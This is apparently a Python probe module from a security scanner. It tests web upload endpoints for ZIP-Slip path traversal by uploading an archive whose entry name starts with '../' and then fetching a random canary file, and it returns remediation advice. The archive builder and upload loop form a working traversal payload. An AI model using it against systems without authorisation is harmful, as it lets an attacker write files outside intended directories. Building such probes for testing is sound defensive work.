#!/usr/bin/env python3
# Author: Tim Rice <tim.j.rice@hackrange.com>
# Part of nextgen-dast. See README.md for license and overall architecture.
"""
File upload: ZIP-Slip — archive entries with `../` path components are
extracted outside the intended unpack directory.

Originally documented as CVE-2018-1002200 / Snyk's "Zip Slip" research,
this affects any extractor that does not canonicalise entry names
before joining them onto the unpack root. Java's
`new File(unpackDir, entry.getName())` is the textbook offender; many
Node and Go libraries shipped the same bug.

The probe builds a ZIP with a single entry whose ARCHIVE name is
`../round12-zipslip-canary-<token>.txt`, containing a known marker
string. The relative-traversal walks one directory up from the
extraction root. After the upload, we attempt to fetch the canary at
common neighbouring paths (web root, upload root's parent dir served
from `/`, etc.). The marker is high-entropy and unique per run, so a
match is structurally unambiguous.

This is benign because the canary is a 64-byte text file with random
content — it overwrites nothing essential, and even if writes outside
the unpack root succeed, the file's contents are inert.

Detection criteria — ALL must be true for validated=True:
  (a) upload returned 2xx,
  (b) we fetched a canary URL same-origin and got 200, AND
  (c) the body contains the unique marker token we wrote into the
      archive entry.

Detection signal:
  Same-origin fetch of `/round12-zipslip-canary-<token>.txt` (or a
  small set of neighbouring paths) returns 200 with our marker.
"""
from __future__ import annotations

import io
import secrets
import sys
import zipfile
from pathlib import Path
from urllib.parse import urljoin, urlparse

sys.path.insert(0, str(Path(__file__).parent.parent))
from lib import Probe, Verdict, SafeClient   # noqa: E402

UPLOAD_PATHS = (
    "/file-upload",
    "/upload",
    "/api/upload",
    "/api/file/upload",
    "/api/files",
    "/files/upload",
    "/uploads",
    "/api/import",
)

# Where the traversed file might end up — one level above the upload
# directory is the most common landing zone for `../`. We try a handful
# of common public roots; the canary is high-entropy so any match is
# decisive.
CANARY_FETCH_ROOTS = (
    "/",
    "/static/",
    "/public/",
    "/uploads/",
    "/files/",
)


def _hdr(headers: dict, name: str) -> str:
    name_l = name.lower()
    for k, v in headers.items():
        if k.lower() == name_l:
            return v
    return ""


def _build_zipslip(canary_name: str, marker: str) -> bytes:
    """In-memory ZIP whose single entry escapes the unpack root via
    a `../` prefix. We also include one well-formed sibling entry so
    the archive doesn't look pathological at the directory listing —
    extractors that skip suspicious entries would be tipped off by an
    archive containing nothing else."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, mode="w",
                         compression=zipfile.ZIP_STORED) as zf:
        # The slip entry. ZIP allows arbitrary path strings; "../" is
        # a path-name component, not a parser error.
        slip = zipfile.ZipInfo(f"../{canary_name}")
        zf.writestr(slip, marker)
        # A benign placeholder so the archive isn't single-entry-
        # suspicious. Content is irrelevant.
        zf.writestr("readme.txt", b"round12 placeholder\n")
    return buf.getvalue()


def _build_multipart(filename: str, content: bytes,
                     field: str = "file") -> tuple[str, bytes]:
    boundary = "----dast-zipslip-" + secrets.token_hex(8)
    crlf = b"\r\n"
    parts = []
    parts.append(("--" + boundary).encode())
    parts.append(
        f'Content-Disposition: form-data; name="{field}"; '
        f'filename="{filename}"'.encode())
    parts.append(b"Content-Type: application/zip")
    parts.append(b"")
    parts.append(content)
    parts.append(("--" + boundary + "--").encode())
    parts.append(b"")
    return boundary, crlf.join(parts)


class UploadZipslipTraversalProbe(Probe):
    name = "upload_zipslip_traversal"
    summary = ("Detects ZIP-Slip — archive extractor writes entries "
               "with `../` paths outside the intended unpack root.")
    safety_class = "probe"

    def add_args(self, parser):
        parser.add_argument(
            "--upload-path", action="append", default=[],
            help="Additional upload endpoint to try (repeatable).")
        parser.add_argument(
            "--field", default="file",
            help="Multipart field name (default: file).")

    def run(self, args, client: SafeClient) -> Verdict:
        if not args.url:
            return Verdict(ok=False, error="--url is required")
        parsed = urlparse(args.url)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        paths = list(UPLOAD_PATHS) + list(args.upload_path or [])

        # Per-run unique tokens — the canary FILENAME and the marker
        # CONTENT are both random, so a match is unambiguous.
        token = secrets.token_hex(8)
        canary_name = f"round12-zipslip-canary-{token}.txt"
        marker = f"round12-zipslip-marker-{secrets.token_hex(16)}"
        zip_bytes = _build_zipslip(canary_name, marker)

        attempts: list[dict] = []
        confirmed: dict | None = None

        # Phase 1 — try uploading. We don't bail mid-loop on a 4xx; the
        # next endpoint may accept it. If ALL endpoints reject, we end
        # up with no canary to fetch and exit refuted.
        any_accepted = False
        for p in paths:
            upload_url = urljoin(origin, p)
            zip_filename = f"r12-{secrets.token_hex(4)}.zip"
            boundary, body = _build_multipart(
                zip_filename, zip_bytes, field=args.field)
            r = client.request("POST", upload_url, headers={
                "Content-Type": (
                    f"multipart/form-data; boundary={boundary}"),
            }, body=body)
            row: dict = {"path": p, "upload_status": r.status,
                         "upload_size": r.size}
            if r.status in (200, 201, 202, 204):
                any_accepted = True
                row["accepted"] = True
            attempts.append(row)
            # Stop after the first acceptance — the canary is fixed,
            # so trying multiple endpoints just burns budget without
            # increasing detection probability.
            if any_accepted:
                break

        # Phase 2 — try to fetch the canary at neighbouring public
        # roots. Limit to a small handful of probes.
        if any_accepted:
            for root in CANARY_FETCH_ROOTS:
                fetch_url = urljoin(origin, root + canary_name)
                fr = client.request("GET", fetch_url)
                if fr.status == 200 and fr.body and marker.encode() in fr.body:
                    confirmed = {"served_url": fetch_url,
                                 "marker_seen": True,
                                 "served_size": fr.size}
                    attempts.append({"phase": "fetch", "url": fetch_url,
                                     "status": fr.status, "match": True})
                    break
                attempts.append({"phase": "fetch", "url": fetch_url,
                                 "status": fr.status, "match": False})

        evidence = {"origin": origin, "canary_name": canary_name,
                    "marker_excerpt": marker[:8] + "*"
                                       * max(0, len(marker) - 12)
                                      + marker[-4:],
                    "attempts": attempts}
        if confirmed:
            return Verdict(
                validated=True, confidence=0.95,
                summary=(f"Confirmed: ZIP-Slip — entry "
                         f"`../{canary_name}` was extracted and is "
                         f"now reachable at {confirmed['served_url']}. "
                         "The extractor honors `..` path components, "
                         "letting an archive write anywhere the unpack "
                         "process has filesystem permissions."),
                evidence={**evidence, "confirmed": confirmed},
                severity_uplift="critical",
                remediation=(
                    "Before writing each extracted entry, canonicalise "
                    "the destination path and verify it is INSIDE the "
                    "unpack root:\n"
                    "  - Java: use `targetFile.getCanonicalFile()."
                    "toPath().startsWith(unpackDir.getCanonicalFile()."
                    "toPath())`.\n"
                    "  - Python: `os.path.realpath(dest).startswith("
                    "os.path.realpath(unpack_dir) + os.sep)`. (And use "
                    "`zipfile.ZipFile.extract`, which already does this "
                    "check on recent Python versions.)\n"
                    "  - Node: `path.resolve(unpackDir, entry.fileName)"
                    ".startsWith(path.resolve(unpackDir) + path.sep)`.\n"
                    "Any entry whose name normalises outside the root "
                    "should fail the unpack with an audit-logged error."),
            )
        return Verdict(
            validated=False, confidence=0.85,
            summary=(f"Refuted: tested ZIP-Slip on {origin}; canary "
                     f"never appeared at expected fetch paths "
                     f"({len(attempts)} attempts)."),
            evidence=evidence,
        )


if __name__ == "__main__":
    UploadZipslipTraversalProbe().main()
